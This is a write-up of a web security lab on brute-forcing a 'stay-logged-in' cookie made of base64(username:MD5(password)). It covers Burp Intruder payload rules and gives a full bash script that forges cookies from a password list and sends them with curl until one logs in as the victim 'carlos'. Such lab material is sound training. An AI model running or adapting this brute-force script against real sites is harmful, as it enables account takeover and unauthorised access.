# Lab: Brute-forcing a stay-logged-in cookie

This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his `My account` page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- Wordlists: Candidate passwords
---

# Session Cookie Analysis and Attack Execution

## 1. Stay logged in Option
- When logging in and selecting the "Keep me logged in" option, the processing appears as follows:  
  ![image](https://github.com/user-attachments/assets/26704adc-199f-4482-86e1-a621abeb964f)

---

## 2. Decoding the Cookie
- We know the cookie is encoded in `base64`. After decoding, we obtain the following structure:  
  `wiener:<hash md5>`  

- The value `51dc30ddc473d43a6011e9ebba6ca770` contains 32 hexadecimal characters, suggesting it is an `MD5 hash`:  
  ![image](https://github.com/user-attachments/assets/9062361d-8f9b-4183-8b59-c7c0fb02bbe8)

---

## 3. Sending the Request to Intruder
- We send the request to the Intruder tool, ensuring the session cookie is empty.  
- Then, we add `payload processing` rules as follows:
  1. Compute the MD5 hash of the password.
  2. Add the prefix `carlos` to the hash.
  3. Encode the resulting string in `base64`:  
  ![image](https://github.com/user-attachments/assets/3327d4f6-8126-46ce-afb7-ad0fbd66084a)

---

## 4. Executing the Attack
- Finally, we execute the attack to identify valid payloads:  
  ![image](https://github.com/user-attachments/assets/4b9e1439-eab0-4804-9174-5920037396d3)  
  ![image](https://github.com/user-attachments/assets/417e5ff9-b40f-4f22-956c-a227a9c08275)


We can perform the same attack using a `bash` script:
```bash
#!/bin/bash

url="https://0a1000a3041a58d888ed1b57003c00e2.web-security-academy.net/my-account"
password_file="passwords.txt"
user="carlos"

if [[ ! -f $password_file ]]; then
    echo "Error: The file '$password_file' does not exist."
    exit 1
fi

generate_encoded_value() {
    local password=$1
    local md5_hash
    local encoded_value

    md5_hash=$(echo -n "$password" | md5sum | awk '{print $1}')
    encoded_value=$(echo -n "$user:$md5_hash" | base64)
    echo "$encoded_value"
}

headers=(
    -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0"
    -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8"
    -H "Accept-Language: es-AR,es;q=0.8,en-US;q=0.5,en;q=0.3"
    -H "Accept-Encoding: gzip, deflate, br"
    -H "Referer: https://0a7f00c6031e1f6f8277ec00004a002d.web-security-academy.net/login"
    -H "Upgrade-Insecure-Requests: 1"
    -H "Sec-Fetch-Dest: document"
    -H "Sec-Fetch-Mode: navigate"
    -H "Sec-Fetch-Site: same-origin"
    -H "Sec-Fetch-User: ?1"
    -H "Priority: u=0, i"
    -H "Te: trailers"
)

while read -r password; do
    # Ignorar líneas vacías
    [[ -z "$password" ]] && continue

    # Generar cookie stay-logged-in
    encoded_value=$(generate_encoded_value "$password")

    # Enviar la solicitud con curl
    response=$(curl -s -w "%{http_code}" -o response.html "${headers[@]}" \
        -b "stay-logged-in=$encoded_value; Session=" \
        -G "$url" --data-urlencode "id=$user")

    # Verificar si la respuesta contiene "Bienvenido"
    if grep -q "Bienvenido" response.html || [[ $response -eq 200 ]]; then
        echo -e "\nPassword: $password"
        echo "Cookie stay-logged-in: $encoded_value"
        break
    fi
done < "$password_file"

rm -f response.html
```

![image](https://github.com/user-attachments/assets/85a88dd5-f401-461b-ac25-50e923e6b576)


